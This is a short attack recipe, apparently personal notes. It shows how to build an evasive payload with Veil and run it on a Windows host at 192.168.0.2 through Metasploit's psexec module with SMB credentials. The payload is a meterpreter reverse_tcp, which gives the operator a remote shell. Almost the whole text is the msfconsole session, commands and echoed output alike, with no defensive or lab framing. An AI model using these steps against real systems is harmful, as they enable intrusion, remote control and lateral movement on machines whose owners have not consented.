1. Generate executable using Veil.

2. In msfconsole setup psexec with relevant payload (windows/meterpreter/reverse_tcp)

msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 192.168.0.2
RHOST => 192.168.0.2
msf exploit(psexec) > set SMBUser user
SMBUser => user
msf exploit(psexec) > set SMBPass pass
SMBPass => pass
msf exploit(psexec) > set EXE::Custom /root/Desktop/Misc/Veil-master/payload.exe
EXE::Custom => /root/Desktop/Misc/Veil-master/payload.exe
msf exploit(psexec) > exploit